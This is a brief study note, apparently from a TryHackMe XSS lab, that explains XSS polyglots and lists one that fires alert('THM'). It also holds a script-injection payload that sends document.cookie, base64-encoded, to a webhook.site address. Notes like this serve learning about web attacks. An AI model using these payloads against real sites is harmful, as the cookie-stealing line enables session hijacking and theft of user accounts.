2025-07-16 19:33

Status:

Tags: [[THM Web Fundementals]] [[tryhackme]]
###### Prerequisites: 
# XSS Polyglot
Polyglots:

  

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.  

  

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``


"></textarea><script>fetch('https://webhook.site/4f8ed567-883b-4e73-a3d6-28d5035c54a7?cookie=' + btoa(document.cookie) );</script>


# 3b4df70b-c778-432c-9117-eddacb6ac273